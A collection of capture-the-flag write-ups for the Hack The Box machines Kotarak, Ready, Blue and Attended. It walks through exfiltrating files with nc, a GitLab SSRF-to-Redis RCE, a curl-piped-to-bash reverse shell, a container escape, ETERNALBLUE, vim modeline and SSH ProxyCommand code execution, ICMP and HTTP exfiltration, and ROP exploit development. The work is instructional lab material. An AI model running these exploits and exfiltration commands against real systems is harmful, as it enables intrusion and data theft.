I’ll exfil each over nc. For example, I’ll start a listener with nc -lnvp 443 > 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit on my VM, and then run cat 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit | nc 10.10.14.15 443 on Kotarak.
secretsdump will extract all the hashes from an ntds.dit file using the SYSTEM reg hive to decrypt:
I’ve used tee to write the output to a file so I can easily grab the NTLM hashes from the output:
I can run these through hashcat, but as NTLM hashes aren’t salted per user, any word I would check without some customization to the target has already been calculated by sites like crackstation.net. Three of the passwords break:
The empty password isn’t too useful, but I’ll note the other two. Password123! is associated with the atanas user in this dump, and f16tomcat! is associated with the administrator account.
atanas doesn’t have permissions to SSH using a password, but this password will work with su from the local shell as tomcat:
atanas has permission to read user.txt:

Category: Shell as root
Unlike most HTB machines, as this user I can enter and list files in /root:
In fact, not only can I list the files, but read both flag.txt and app.log. flag.txt is a hint to continue looking:
I interpret this to mean that it’s on another host, as I noted earlier that there are likely containers involved on this system.
app.log shows what look like Apache access.log entries:
Some observations:
There’s another system on 10.0.3.133. This makes sense given I noted the additional IP address on this host of 10.0.3.1 earlier. That host still exists:
The requests seem to be arriving every two minutes.
The requests come from wget, version 1.16.
The first question I had is if these requests are still coming. To check that, I need some way to listen on port 80 on this host. Unfortunately, by default, a non-root user can’t listen on a port below 1024:
I spent a bit of time looking for any binaries with capabilities that might allow them to bind, but no luck. I did come across authbind:
authbind is a program that allows non-root users to bind on low ports.
With authbind, I’m able to listen on port 80 without issue:
I’ll use nc so I can see what a full request looks like if it comes. In less than two minutes, I get a connection from 10.0.3.133:
Still using wget to request /archive.tar.gz.
The default wget behavior is to write the requested file to disk in the current directory with the filename indicated by the url. So when wget requests http://website.com/folder/file.txt, the default behavior is to save that as ./file.txt.
CVE-2016-4971 is a neat exploit against Wget version < 1.18 that abuses has wget handles an HTTP redirect to an FTP server. When wget redirects to another address using http, it would get that file but still save it as the original requested filename.
So for example, if wget sends a GET request to http://website.com/folder/file.txt, and the server responds with a 301 or 302 redirect to ftp://evil-server.com/evil.txt, wget will go get that file (which is fine) and save it as evil.txt (which is not fine).
Especially in a cron scenario, the jobs typically run out of the running user’s home directory. The ability to write arbitrary files in a home directory is dangerous.
There are many ways to exploit this vulnerability. I could drop a .bashrc file and wait for someone to start a shell. If I thought perhaps the wget was being run from a web directory, I could look at uploading a webshell.
There’s a proof of concept for this CVE on exploitdb. It’s strategy is to write a Wget Startup file. Based on the priority wget looks for these files, as long as there’s nothing in the /usr/local/etc/wgetrc and the env variable WGETRC isn’t set, it will try to load from $HOME/.wgetrc.
This fill will set arguments for wget that aren’t passed on the command line. The POC uses two of these with the following .wgetrc file:
This sets two options:
post_file:
Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘–post-file=file’.
output_document:
Set the output filename—the same as ‘-O file’.
This POC will exploit over the course of two requests (so it’s targeted against a process where wget is running on cron, which seems perfect for Kotarak).
The first request is what is exploited by this exploit, to write the .wgetrc file into the running home directory. The next time it goes to make the same request, it will POST the shadow file, and then save the result into the /etc/cron.d directory.
I’ll need multiple shells on the box, either by trigger the WAR file a few times. I’ll work out of a directory in /tmp. In one shell, I’ll drop the .wgetrc file:
And start a Python FTP server:
I’ll save a copy of the Python POC locally and make a few edits. It’s got go_GET and a do_POST methods to handle incoming requests. It assumed the first request will be a GET, and will redirect that to get the .wgetrc. Then the next request will be a POST if that worked, and that’s where it returns the cron file. Those functions are fine. There’s some configuration at the bottom that needs updating:
The HTTP listen needs to be on the IP that the container is connecting to.
Now the cron will result in a reverse shell. With a Python webserver in my VM, I’ll grab it with wget:
Now run it with authbind, and it checks that the FTP server is good, and then waits:
There is a connection at the FTP server as well:
After a minute, the first request comes in, a GET, and it’s handled with the redirect:
Immediately after there’s another connecting on FTP:
Now the config file is in place, the next time the script tries to run, I should see a POST request. It worked:
The shadow file doesn’t have anything that useful in it. But hopefully this indicates that the cron was written. One minute later:
This shell on the on host kotarak-int, and it has landed me as root. I can read root.txt:
I actually found this root before finding the intended path. The first thing I check when I get a shell is the groups the user is in with the id command:
I also knew at this point that there was another container involved this box, and that I likely needed to get into it. I don’t see the lxc group here (or docker if this was running in Docker containers), which doesn’t let me interact with the container directly. But atanas is in the disk group, which gives access to the raw devices.
lsblk shows how the devices are configured:
Kotarak--vg-root and Kotarak--vg-swap_1 are the root file system and swap space under LVM. Both live on the sda5 partition on sda. The LVM mappings live in /dev/mapper:
dm-0 is the device I want to read off to get the root of the filesystem.
I’ll use dd to read from the device, and nc to copy the entire filesystem off the device back to my host. I’ll send it through gzip to compress it so that it will move faster, but it still takes over seven minutes:
Back on my host:
When it’s done, the compressed file is a bit over two gigs:
It decompresses to seven gigs:
I can mount it, and access the file system:
/root is the host system, with flag.txt, not the container with root.txt:
The containers keep their file system mounted in /var/lib/lxc/:
I can verify that as atanas I can’t just access that directory directly:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 12 Dec 2020
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.021s latency).
Not shown: 59697 closed ports, 5836 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreenCategory: Recon
nmap found two open TCP ports, SSH (22) and HTTP (5080):
Based on the OpenSSH version, the host is likely running Ubuntu Focal 20.04.
Based on the nmap script results, oprt 5080 seems to be running an instance of GitLab over HTTP.
The site is, in fact, GitLab:
The “Explore” link at the bottom will show any public repos, groups, or snips, but there are none. The help page is the generic help, with nothing interesting.
I’ll register for an account, and nothing changes, except the Help page now has a version and a warning:
There’s now a version and a warning to update ASAP.

Category: Shell as git [Container]
Seeing as this version is out of date, some Googling turned up a good number of POCs for a vulnerability in this version. There’s actually two vulnerabilities, a Server-Side Request Forgery (SSRF) vulnerability (CVE-2018-19571) and a Carriage-Return Line-Feed (CRLF) Injection vulnerability (CVE-2018-19585).
A SSRF vulnerability is where an attacker can trick the server into making request on their behalf. In this case, the vulnerability is on the New Project –> Import Project page:
When I select “Repo by URL”, I’m given the chance to input a URL, and the server will make a GET request to that URL. I’ll open nc on port 80 and give it http://10.10.4.8 as the URL. The website shows an import in progress that just hangs. At my VM, a request arrives:
To exploit this as an SSRF, I’ll use this to send a request from Ready. But with all of that HTTP header, I basically can only send a GET request. In the past, I’ve played with things like Gopher to get better control over what I send in an SSRF, but GitLab only accepts http://, https://, and git:// as protocols in the import url.
git:// is interesting. I need to give it something that ends in .git, like git://10.10.14.8:80/test/.git. With nc listening, I create that project:
That’s only one line, much cleaner.
Still, this isn’t a big deal to just access URLs on the internet, unless I can access something that the system owner doesn’t think I can access, like services on the local GitLab server. The issue for this CVE is that while GitLab blocks connections to 127.0.0.1, it doesn’t block connections to http://[0:0:0:0:0:ffff:127.0.0.1], which is an IPv6 address for localhost.
I’ll test this. GitLab has a Redis server listening on localhost only on TCP 6379. If I try to import from http://127.0.0.1:6379, it complains:
I’ll change that URL to http://[0:0:0:0:0:ffff:127.0.0.1]:6379:
This import will just fail eventually, as Redis doesn’t provide a Git repo that the import is expecting.
This vulnerability allows me to put newlines into the url, which results in the connection to something like Redis to be a connection followed by a series of independent commands. I’ll look at this again with nc. I’ll import the url git://10.10.14.8:80/test/.git again, but this time I’ll intercept the request in Burp Proxy.
I’ll edit the request to add lines in the middle of the url:
I’ll send that, and at nc I see the result:
If I sent this request to Redis, the first line would error, but then lines 1-3 could be good commands that I want to execute.
This HackerOne report shows how to use GitLab Redis to get command execution by sending these commands:
To put this all together, I’ll delete my project and start a new import with the URL git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git, and intercept it in Burp. I’ll add in the additional Redis commands, making sure to start each line with a space, and modifying his payload to send the results of whoami back to my IP:
This POC is going to run whoami and pipe that into nc back to my IP. On sending that request, I get a connection with a single word:
I had to play with payload a bit to get a reverse shell that worked. I tried a handful of things that didn’t work, but eventually went back to an old standby of using curl to get a Bash script from my VM and pipe it into bash. shell.sh was:
Then the payload was:
On creating that project, I get a shell:
I’ll upgrade my shell with the standard tricks:
I’ll also find the user flag in /home/dude:
There’s a bunch of POCs out there that will do that exploit chain for you. This one worked well. I’ll download the Python script, and run it giving my username and password, the url for the repo (it appends the port 5080 for me), and the local IP and port to catch the shell on:
It works and I get a shell:

Category: Shell as root [Container]
There’s a few indications that I’m in a Docker container. For one, there’s very few commands on this host. ifconfig and ip are both not present. There’s also a .dockerenv file in the system root.
There’s nothing interesting beyond the flag in /home/dude. Looking around, there’s a couple things in the /opt directory:
gitlab is the GitLab code, but backup is interesting. It has three files:
gitlab-secrets.json has keys and stuff related to GitLab, but nothing that’s of use to me. docker-compose.yml is interesting, and will be useful later.
gitlab.rb is a config file, where the vast majority of the lines start with a comment, #. I’ll use grep to remove those lines, and then select lines that aren’t blank. There’s only one:
That password is the root password in the container:

Category: Shell as root [host]
The docker-compose.yml file defines the container that I’m currently root in:
privileged: true is a line that’s important. This means that the container has root privileges on the host, and that I can escape.
This post has a nice POC that works to execute a command on the host from a privileged container. It runs ps, but I’ll modify that to run the same reverse shell from earlier:
Those commands may look like complete nonsense on first glance. I created a follow-on post digging into this.
On running the last command, I get a request for shell.sh at my Python webserver, and then a shell at a listening nc on my VM:
I can upgrade my shell just like above, and access root.txt:
Instead of running commands, I could also mount the host filesystem. lsblk shows the devices, and sda2 looks like the main disk:
I’ll mount it, and now have access to the host filesystem:
I can get the flag:
There’s also an SSH key already there, or I could write my own into the authorized_keys file.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 28 Jul 2017
OS : Windows
Base Points : Easy [20]
Nmap scan:
Host is up (0.021s latency).
Not shown: 65517 closed ports
PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknownCategory: Recon
nmap found three standard Windows ports in RPC (135), NetBios (139), and SMB (445), as well as some high RPC associated ports in the 49000s:
The SMB output says this is Windows 7 Professional.
There are a couple shares with null session read access (the trick of giving smbmap wrong creds works here):
Share is empty:
Users has just empty Default and Public folders:
nmap has vuln scripts that will check for known vulnerabilities in service. I’ll run them here, and it finds a big one, MS-17-010:

Category: Shell as System
MS-17-010, otherwise known as ETERNALBLUE, is a unauthenticated remote code execution vulnerability in Windows SMB most famous for it’s leak by the Shadow Brokers and for driving the WannaCry worm in May 2017.
The exploits in Metasploit for MS17-010 are much more stable than the Python script counterparts. If you’re doing this in the real world, I’d strongly recommend using Metasploit here. If you’re doing this for some kind of training activity that doesn’t allow Metasploit (like OSCP), then the downside of crashing a few boxes acceptable. I’ll show both.
The easiest way to pull this off is with Metasploit. I’ll start it with msfconsole, and then search for MS17-010:
4 is a scanner, and 5 is using a backdoor that must already be on the system, so they are out. 1 is specifically for Win8, which is not this system. 3 is auxiliary, though it says command execution, so I don’t want to rule it out, but I’ll put it last. That leaves 0 and 2.
I’ll try 0:
I’ll set the target and my local IP, and the rest of the options look good:
Running it returns a shell as SYSTEM:
I find it easier to work out of a real shell since I don’t use Meterpreter very often:
Now just grab the flags:
In coming back to write this post, I wasn’t able to find a Python3 script to do MS17-010. This led to a bit of a tough spot, as my VM was configured to use Impacket with Python3.
I created a virtual environment that would use Python2 with Impacket. First I cloned Impacket into /opt:
In Python3, there’s a builtin venv module for creating virtual environment. But for Python2, I need to apt install virtualenv.  Now I’ll create that environment folder in the Impacket directory using the -p flag to tell it I want Python2:
Now when I activate it, I get the updated prompt, and python is python2.7:
I’ll install pip:
Now finally install Impacket:
The best MS17-010 Python scripts I know of are from worawit. These work well, but are a bit confusing to use. helviojunior forked that repo and added a single send_and_execute.py, which is really handy. It’s simply an update of the zzz_exploit.py script from the original, but it is modified to upload a file and execute it as system.
In zzz_exploit.py, there’s a function, smb_pwn:
This is the action taken with the exploit. In this case, without mod, it’s creating C:\pwned.txt on the target. But the commented out lines show how the functions in this file can be used to also upload to the target (smb_send_file) and execute as a service (service_exec).
The updated send_and_execute.py adds some handling of command line args, and then this function:
It’s very similar to what’s going on in the original, but it’s updated to upload lfile to C:\filename and then run it.
You can either modify zzz_exploit.py, use send_and_execute.py, or make your own script using the functions from that repo.
Just like with smbmap above, when I try to run this with username as an empty string, it won’t auth. However, if I just add any string into the username, it will then work.
When I was doing OSCP (2.5 years ago now), there were many boxes that would fall to this script with blank creds. I believe it should act similar to what you see with smbmap. But just like there, it’s always better to try both with and without bad creds if you aren’t sure (and of course if you have good creds, then use those!).
I’ll generate a payload with msfvenom:
While x64 is relatively universal for Windows systems today, in 2017 when this box was released, x86 was much more common, especially in Windows 7.
shell_reverse_tcp is a raw command shell (non-meterpreter), and it is not staged (which is to say the entire payload is in that one exe, instead of just a stub that will connect back and get the rest). With both of those, I can just catch the shell with nc. If I wanted a staged payload, I would have done shell/reverse_tcp.
With the username updated to “0xdf”, I’ll start nc, and run send_and_execute.py:
At the line sixth from the end, where it says “Starting Service”, I get a connection at nc:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 19 Dec 2020
OS : OpenBSD
Base Points : Insane [50]
Creators : gulyfreshness
Nmap scan:
Host is up (0.026s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtpCategory: Recon
nmap found two open TCP ports, SSH (22) and SMTP (25):
OpenSMTPD is associated with OpenBSD, which matches what HTB says this machine is.
nmap showed a connection string, but it’s easier to see with telnet:
I’ll note both the username guly and the domain attended.htb.
I’ll give it a EHLO message to start the session:
The HELP command isn’t useful:
VRFY doesn’t seem to work:
I can check for valid accounts using RCPT TO commands:
The other box creator also has an account on the box:
I played around with brute forcing other names with smtp-user-enum in a bash loop. root also exists:
I didn’t find much else.
At this point I started sending emails to the accounts I had, starting with guly, since it was the first to show up. I’ll try sending him an email using swaks, and listening for a reply with python’s SMTP server (I did something similar in FluJab, but this time I’ll just run the module from the command line rather than in a script).
It took a few tries to get an email to send. Sending to guly, guly@10.10.10.221, guly@localhost or guly@127.0.0.1 returned error messages. Using the domain from the smtp message worked:
A minute later an email arrives that looks like an out of office response:
There’s a ton of hints in here:
I tried sending an email from freshness:
Interestingly, I got an email back at my SMTP server:
The address seems to have been re-written from freshness@attended.htb to freshness@10.10.14.14. This is a pretty unrealistic automation (I don’t really see how it would have happened in the real world… maybe if I had added myself as a CC, and then gotten a reply all?), but, I stumbled into it. So I’ll proceed. Sometimes in CTFs (and probably in real life as well) you just have to try some stuff.
guly is asking for an attachment, and the PS gives hints about a legacy Python environment on the gateway, and traffic restrictions.
If I attach a Word doc to the same send line below (swaks --to guly@attended.htb --from freshness@attended.htb --header "Subject: file you asked for?" --body "Here you go" --server 10.10.10.221 --attach @s.doc), the response reminds me of guly’s dislike of MS Office:
hi mate, i’m sorry but i can’t read your attachment. could you please remember i’m against proprietary e-mail attachments? :)
If instead I send a .txt file, guly replies:
thanks dude, i’m currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax.
if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
test it ASAP and let me know if you still face that weird issue.
A hint for later - freshness will be “testing his config file”.

Category: RCE as guly
The email explicitly says that guly will open the attachment in vim. There’s an arbitrary code execution exploit in vim, CVE-2019-12735 that involves attack the modelines feature. A proof of concept was published on GitHub.
The first POC on that repo looks like this:
That runs uname -a. There’s another for a reverse shell using nc:
To test, I downloaded the simple POC and replaced uname -a with a ping:
I started tcpdump, and then sent that as an attachment (swaks --to guly@attended.htb --from freshness@attended.htb --header "Subject: file you asked for?" --body "Here you go" --server 10.10.10.221 --attach @poc.txt), and a minute later, first the same note about opening it in vim, and then a few seconds later, ICMP packets are tcpdump:
That’s successful remote code execution.
From here, I wanted to use that to get a shell. I tried a lot of things that didn’t work:
The line from guly’s note to freshness is important:
i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions.  i think it should stop any non RFC compliant connection
My best guess is that “new outbound traffic restrictions” explains why a reverse shell won’t connect back. From a lot of testing, it seems like only ICMP and valid HTTP (on TCP 80 and 8080) are allowed out through the gateway. As far as I know, there are three ways to get a connection back and exfil data:
I already know that ICMP gets out from my POC. I can use the -p option to put command output there (hex encoded). For example, with an attachment like this:
That will execute ping, and -p sets the payload to the output of what’s in the backticks. In this case, it’s the id command, which I’ll have to then hex encode with xxd -p so that it can go into the ping. The challenge is that only the first 16 bytes will come back:
The result of id is started there (three times), uid=1000(guly) g. I could use Python2 to run commands, collect data, and then loop over the results to send them back over ICMP.
ftp on BSD does something I wasn’t aware of, in that if I run ftp http://10.10.14.14/test it will get the file similar to wget. A payload like this will return the output of id to a web server on my hosts:
I used xxd as base64 doesn’t seem to be on the box (it turns out that piping into openssl base64 will work).
That url decodes:
I could also use this method to upload files to Attended with a few more args to the ftp binary.
The first of these I found was requests, and so that is what I’ll show for the remainder of this post. The payload looks like this:
It uses os.popen to run a command and get the output, then base64-encodes it and sends it back over HTTP using requests:
Decoding the result provides the expected output:
In trying all this, I have a pretty good feel that the automation that is running vim is running every minute. It’s going to be really slow until I get to a better shell. Still, I want to automate this so that I can run commands more easily without having to edit a text file each time.
My first attempt was to create a Python script that would generate the payload, then create an email and attach the payload, and send it, and then handle the response:
The command to run is taken from the command line, and used to build the payload. Then the email is created and the payload attached. It sends the email, and prints the time. Then it starts a raw socket on 80 waiting to get the response, which it reads, breaks apart to get the base64-data, decodes, and prints.
It works:
One thing I noticed was that longer results just didn’t connect back at all. There’s a maximum URL length around 2000 characters. Base64 inflates the results by an extra 33%, so I found that adding os.popen('{command}').read()[:1500] made it so that it would always return, but still, some output was truncated.
I had tried to just send results out as POST requests, but it seems like only GET requests make it out.
For a more complete approach, I’m going to upload a script to Attended that I can call, and it will manage sending back data in multiple requests. upload.py which will generate a vim exploit that uses requests to GET a file from my VM (served from the current directory).
The payload is just calling requests, reading the response, and writing it to a file. Then it uses smtplib and email.message to create an email, attach the attachment, and send the email. Finally, it starts an HTTP server to handle the next request to my VM served from the current directory. Running it looks like:
The script I’m going to upload isn’t complicated. It needs to run the take an argument from the command line, run it, break the results into 1500 byte blocks, loop over the blocks, base64encoding and sending a HTTP GET.
I found that adding a sleep prevented the host from overwhelming the server, and most of the time didn’t add too much time. When the file is done, I’ll send a request to /done so the server knows it has the full file.
I think if I were doing this again, I’d break this script into two - one to send commands, and one to handle responses. Or, I would go with a more complicated agent running on attended (see next section). But I did this in one script the send a command, and wait for a response.
This script will send the vim payload, and then start a socket server to handle responses until it gets a request to /done, and then it will print the result. I made an effort to have status messages print tp STDOUT so that I could redirect the file itself to a file and not get them.
It works:
It also handles longer outputs. For example, ls -l /etc takes three requests to get the full results:
The next step would be to update the client on Attended to run an infinite loop, checking back with GET requests for commands, and if there was a new command, running it and sending back the results. I was able to find what I needed with the solution above, but that would be much more user friendly to work with, and how real malware typically operates.

Category: Shell as freshness
The current directory is /home/guly:
Listing that dir shows a couple things:
.ssh is not writable, so I can’t get a shell that way. There is a tmp directory. It contains a single file:
I had a hard time getting the file with a hash match on the file on Attended, but the strings in the file were close enough to suggest what the file was:
The user was editing an SSH config file.
There was the line in guly’s note to freshness:
if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
test it ASAP and let me know if you still face that weird issue.
It’s a hint that if I drop a config file into /home/shared, it will be “tested” by freshness.
The /home/shared directory does exist, and guly can write to it but not read from it:
An SSH config file defines a given SSH connection. For example, if you regularly had to connect to a given host on a nonstandard port and with a SSH key that isn’t in your .ssh directory, you could specify those in a config file and then invoke that to avoid having to type all that out each time you wanted to connect.
The BSD man page or ssh_config shows the various options that can be included, and there’s one that’s really interesting - ProxyCommand:
It’s going to run a command before connecting. That’s something I can abuse.
To test this, I’ll create a simple config file with a ProxyCommand to ping my host:
I used Host * because the man page under the Host keyword says “A single * as a pattern can be used to provide global defaults for all hosts”. I need to drop this into the /home/shared directory. Luckily, I already have a script do to that:
About a minute after the upload, ICMP packets arrive at my VM:
It wouldn’t be too difficult to build out a freshness shell based on the parts I already have. I would start with the cmdrunner-server script I already have, and update it to write the command I want run into a template SSH config file, and then use the vim exploit to write that file into /home/shared. If I had the command run through /tmp/cmdrunner.py on Attended, I could even use the same server to receive the results.
I didn’t have to go that way because I first checked to see if I could write a SSH key into /home/freshness/.ssh/authorized_keys with the following config file:
I’ll upload it just like before:
Once I see the request, I’ll sleep for 60 seconds (to allow for the second cron to pick up and run the config file), and then connect with SSH. It works:
And I can grab user.txt:

Category: Shell as root
In freshness’ homedir there’s a couple files besides user.txt, and a directory:
The dead.letter file is a relic of the cron process:
fchecker.py is the script that is automating the SSH config running (more in Beyond Root).
The authkeys dir contains a binary and a text file:
I am running on Attended, but there’s also another “machine” here, the gateway. In fact, I suspect Attended is some kind of container or jail on AttendedGW, as the current IP in this shell is 192.168.23.2.
At this point, it’s worth a quick diversion into some background on how SSH authentication works. When I type ssh root@10.1.1.200, the client will generate a list of private keys that it might try to use for auth. That could be keys in ~/.ssh, or any given with -i in the command line.
From each private key, it will identify the associated public key (by looking for the matching .pub file, or if it can’t find the .pub file, and the private key is of a newer format, extracting the public key embedded in it), and send each of those public keys to the server.
The server will look at each public key and make a decision as to if that user would be allowed to connect. The most common way to do that would be to see if that public key is in the authorized_keys file, but it could also use a command to get public keys from another server, or really do whatever it wants. At this point, the server doesn’t know that the client has the matching private key, it’s just checking to see if the public key is one it would accept. If it finds one, it sends back to the client that it would accept that key.
The client now sends a signature to the server which is cryptographically generated using the private key, and can be verified by the public key.
The server can validate that signature with the public key, and know it knows that the client has the matching private key, and allows the user in. The private key is never transmitted from the client system.
Interestingly, if you try to send a public key to a server with -i, it will go through the first steps, but then the client fails when it’s asked to send a signature and it doesn’t have the private key to do so.
I don’t yet know exactly what implementation of AuthKeys is being used here, but in general, the term applies to a configuration where SSH keys are stored at a central server such that when a user tries to SSH to a host, rather than checking the private key against public keys in a local authorized_keys file, it runs a specified command to get the public key from a server.
I first blogged about the SSH AuthorizedKeysCommand in Ypuffy, and again later in Travel. I pulled the sshd_config from an OpenBSD VM and from Attended, and there are two lines different:
Assuming that the config on the GW is the same (and uncommented because the note.txt said it was enabled), then whenever someone connects with SSH to the gateway, this command will be run. Based on the man pages:
A quick ping sweep of the local network shows only two boxes, .1 and .2:
Given that Attended is .2, AttendedGW must be .1. This is confirmed looking at the /etc/hosts file:
ping by hostname works as well:
I can look for open ports on the box with nc:
There’s a handful of interesting ports here, but as my focus is on SSH, 2222 is the most interesting to start. I can confirm it’s SSH:
I could see from the config file it takes four arguments. Trying to run this binary on Attended won’t work:
It’s set to read, not execute. I’ll copy the file back to my host. It’s a 64-bit ELF:
I’ll create an OpenBSD VM to test in, because while this binary will run in a Linux VM, I don’t like doing pwn with that big a difference. I’ll grab an ISO and build one (it’s pretty quick). This VM hostname is obsd.
Running it without args (or any number of args except four) returns an error:
Running it with four args still basically just exits with a message that it’s incomplete:
It doesn’t really make sense that this incomplete binary is also deployed and enabled on the gateway, but it’s the only lead I have at this point.
Above I was able to read the four args passed to authkeys from the man pages, but I wanted to really see it in action. In my OpenBSD vm, I set a AuthorizedKeysCommand and restart the service:
This script just writes the args to a file:
I’ll generate a key I don’t mind publishing in a blog post:
And SSH to the VM:
It doesn’t work, and asks for a password, which is expected. I can CTRL-c to kill that. Checking the VM, output exists:
The %k value is my public key, and %f is the fingerprint.
In general, my preference for reverse engineering is Ghidra decompliation, then IDA Pro disassembly, then Ghidra disassembly. Ghidra decompliation is really poor with BSD binaries, and after confirming that, I went to IDA. Luckily, there binary is quite small.
It starts with a branch based on the number of args:
The right side (args not equal to five) prints the too bad message, and then exits. It doesn’t really show well in the IDA graph, but after mov eax, 1 and xor rdi, rdi, it calls syscall, and syscall 1 is exit.
Assuming there are exactly 5 in argv (four args plus the program name), it prints the “Evaluating key” message (syscall with rax of 4 is write).
Then it starts at what IDA labels as [rbp + arg_0] (where arg_0 is 8). This is the first of the five argument strings, and a pointer to it is stored in rsi. It sets rbx and rcx to 0, then sets the low byte to five. Next it enters a double loop:
The top square decrements rcx, and then checks if it’s 0, and exits the loops if so. On entering, it’s five, so it decrements to four and goes into the next loop. rsi has the start of the first arg, and rbx is a counter starting at zero. It loads the byte at rsi+rbx, increments rbx, and checks if the byte loaded is zero (the end of the string). If so, it loops back to the first block. For non-zero, it goes to the top of this block. So at the end of the inner loop, it’s found the rsi + rbx point to the first byte after the end of the string. It does this four times.
The inner loop is moving rbx through a string until it finds a null. The outer loop is doing that four times. This has the effect (assuming the five arg strings are stored back to back in memory) of moving rsi + rbx to point to the start of the last argument.
Because I had the four args from above, I can start gdb authkeys and then pass them into the run command:
With a breakpoint at the start of the loop, see the strings in memory. This loop assumes that the five strings are stored in memory one after another, which they are:
An easier way to do this would have been to look at rbp+8, which has pointers to each of these strings:
From here, it calls a function (sub_4002c4), and then prints the message and exits:
The function is mostly one big loop:
This loop starts with a string that is a base64 alphabet:
It’s looping over each character, and using this, I can tell pretty quickly that it’s a base64 decode function.
At the start of the function, it sets r8 to the start of the key string, and that is the pointer that is used to read a byte, and then is incremented.
The issue with the binary is that it only creates 0x300 (768) bytes of space on the stack to hold the decoded bytes. Because of how base64 inflates data, that means I’ll it can only hold keys up to 1024 bytes (base64 encoded).
The RSA key I generated with the default key length decodes to 407 bytes, so that’s fine. But passing in a longer string will crash the program:
The default key size for an RSA SSH key is 2048 bytes, but I can specify more using -b. I’ll make one that’s 16k instead of 2k:
When I SSH to the OpenBSD VM, output gets the new values, and %k is much longer:
That public key is 2764 bytes, which decodes to 2071 bytes, plenty to overflow authkeys.
I need to give ssh a valid key, or the ssh client won’t even try to connect. I spent some time looking at the binary structure of SSH keys, specially the OpenSSH key formats. The new formats of RSA SSH private keys actually have the public key embedded in it. I started off thinking about trying to change the public key from within the private key (before realizing that I could just trigger the vuln with ssh -i public_key, see the SSH Background section above). Still, it’s interesting to see the structure.
The private key is stored in the following structure:
I’ll look at the key decoded as a hexdump with cat test_key-16k | grep -v 'PRIVATE' | base64 -d | xxd | less.
The documentation on this format is proprietary, but this site gives a good break down. My key starts like:
That breaks down to:
There are more fields that come after the public key, but that’s enough for here for now.
Public keys are typically stored in the format:
I’ll use the following to look at the decoded data in the key:
It starts out:
I’ll notice that matches what I saw in the private key exactly.
RFC4253 defines the different key types, where an ssh-rsa is of the structure:
The data type mpint is defined in RFC4251, and it’s got a four byte size, followed by an integer with the most significant byte first. So for the key above, the red is the ssh-rsa size and string, the blue is e size and value, and the orange is the n size and value:
It’s important that the first bit these integer values be 0, or they’ll be treated as negative numbers, which leads to an error that looks like:
I have a vector for an exploit here. If, as the note and commented config on Attended suggest, AttendedGW is running this authkeys binary, there’s a buffer overflow in the forth argument. That forth arg is the public key associated with a login attempt.
If I can craft a SSH key such that the public key is too long, and it overflows the buffer, I can get remote code execution on AttendedGW.
To bring this exploit into being, I’ll need the following steps:
I mentioned above that I created an OpenBSD VM for this box. I like to code in my normal Parrot VM, so I wrote Python there, and then SSHed into the OpenBSD VM to run gdb. gdb kind of sucked on OpenBSD. Because the binary was stripped, to step, it wouldn’t work with n or s, but ni and si worked. I wasn’t able to get Peda working (could be user error). I understand some (believe xct was the source here) were able to get GEF installed with the following steps:
gdb didn’t come with the Python support compiled in, but egdb did.
To run the program, as the first three args didn’t matter, I would run r a a a [base64 part of key].
I’ll use msf-pattern_create to generate a pattern string. I know the buffer is 0x300 bytes, so I’ll generate 0x400 (should be more than enough). Because the input is base64-decoded before it overflows, I’ll encode the pattern:
I’ll use that as the forth arg, and run to the SIGSEGV:
rsp holds the address that would have gone into rip had it been in a valid range:
msf-pattern_offset will show how far into the pattern that occurred:
776 is 0x308, which makes sense given I know the buffer was 0x300.
I tested it by taking a legit large SSH public key, decoding it, and changing the eight bytes at offset 0x308 to 0x0000000004003a9. This address is the start of the code that prints the message about the wrong number of args. So the code will run, check the right number of args, print that it’s evaluating the key, then overflow and end up back at the message about there being the wrong number of args.
That shows the overflow worked and that the exploit gained control over rip.
Looking at the OpenBSD Syscalls I can use execve to run whatever I want. Because I’ll be executing on another system, I can’t just run /bin/sh like I might in a standard local privesc. I know from the emails that legacy Python is on the gateway, so I’ll try to get a reverse shell there with a call like this:
I noticed during the RE that the binary is using syscall regularly, and there’s even a function that was syscall; ret (though the return is relatively unnecessary), so that should be an easy gadget to find. I’ll need to set rax to 0x3b (59) for execve, rdi to the binary string, rsi to the array of args, and rdx to null.
The binary is quite limited in what it has to offer for each of these, and it will make two of them quite challenging.
I’ll use Ropper (pip install ropper) to look for gadgets:
The three above there will be useful. I can set rdx freely with the pop rdx; ret gadget. I can make the syscall as well. There is no easy way to set rdi, but the  mov rdi, rsi; pop rdx; ret; says that if I can solve the problem of setting rsi, then I can also set rdi with this.
All that is missing now is a ways to set rax and rsi.
Looking at all the gadgets, there aren’t many that interact with rax in a useful way. Still, with some creative thinking, I can get anything I want in the low byte of rax using these two gadgets:
I know that just before the return where the address is overwritten, rax is zeroed (along with rsi and rdi):
not al (ignoring the changes to cl as I don’t care about rcx) will take the lowest byte in rax and invert it, changing all the 0s to 1s and 1s to 0s. Because I know the bits higher than the low eight are 0, shr eax, 1 will remove the bit on the right, and add a 0 on the left.
To understand the algorithm needed to generate any number 0-255, I will look at it in binary. 59 is 00111011. I’ll first invert al so it has all 1s:
Next I’ll work from right to left on the target binary string. It starts with two 1s, so I’ll shift twice and not:
Next there is one 0, so shift once, then invert:
Now three 1s, so shift three times, then invert:
Finally, two 0s, so shift twice (and no need to invert):
The path to get something into rsi was tricker, as the number of gadgets that moved useful data into rsi was very limited. This gadget will move something from xmm0 to esi:
If I can get an address up to four bytes into xmm0, then I can use this to get it into rsi. There’s another gadget that will move a double-word into xmm0:
And this one comes from something pointed to by rdx, which I can control easily. So this looks like something I can work with.
